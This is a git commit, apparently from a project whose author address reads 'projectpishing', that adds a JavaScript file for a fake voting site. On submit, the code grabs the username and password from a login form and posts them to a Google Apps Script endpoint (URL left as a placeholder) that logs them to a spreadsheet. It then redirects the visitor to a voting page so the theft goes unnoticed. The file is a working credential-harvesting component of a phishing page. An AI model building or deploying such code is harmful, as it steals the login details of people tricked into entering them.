fa1ab03b501d5e3228cae82efd16f38321885966
vaishuoooo <projectpishing2k25@gmail.com>
2025-03-27 22:26:50 +0530

    Create script.js

---
+++ script.js
@@ -0,0 +1,37 @@
+document.addEventListener("DOMContentLoaded", function () {
+    const loginForm = document.getElementById("loginForm");
+
+    if (loginForm) {
+        loginForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            
+            // Send login data to Google Sheets
+            fetch("https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_URL/exec", {
+                method: "POST",
+                body: JSON.stringify({ username, password, type: "login" }),
+                headers: { "Content-Type": "application/json" }
+            }).then(() => {
+                window.location.href = "voting.html"; // Redirect to voting page
+            });
+        });
+    }
+
+    const voteButtons = document.querySelectorAll(".voteBtn");
+    voteButtons.forEach(button => {
+        button.addEventListener("click", function () {
+            const vote = this.getAttribute("data-name");
+
+            // Send vote to Google Sheets
+            fetch("https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_URL/exec", {
+                method: "POST",
+                body: JSON.stringify({ vote, type: "vote" }),
+                headers: { "Content-Type": "application/json" }
+            }).then(() => {
+                alert("Vote submitted! Thank you!");
+                window.location.href = "thankyou.html";
+            });
+        });
+    });
+});
